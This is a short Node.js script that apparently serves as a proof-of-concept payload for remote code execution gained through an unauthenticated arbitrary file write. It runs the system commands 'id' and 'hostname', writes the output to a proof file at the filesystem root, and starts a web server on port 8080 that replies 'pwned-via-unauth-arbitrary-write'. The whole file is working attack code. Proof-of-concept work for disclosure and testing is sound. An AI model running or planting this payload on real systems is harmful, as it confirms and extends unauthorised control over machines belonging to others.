const cp = require('child_process');
const fs = require('fs');
try {
  const out = 'RCE_OK uid=' + cp.execSync('id').toString().trim() + ' host=' + cp.execSync('hostname').toString().trim() + ' ts=' + new Date().toISOString();
  fs.writeFileSync('/RCE_PROOF_TASKSMD.txt', out);
} catch (e) { fs.writeFileSync('/RCE_ERR.txt', String(e)); }
require('http').createServer(function (q, s) { s.writeHead(200); s.end('pwned-via-unauth-arbitrary-write'); }).listen(8080);
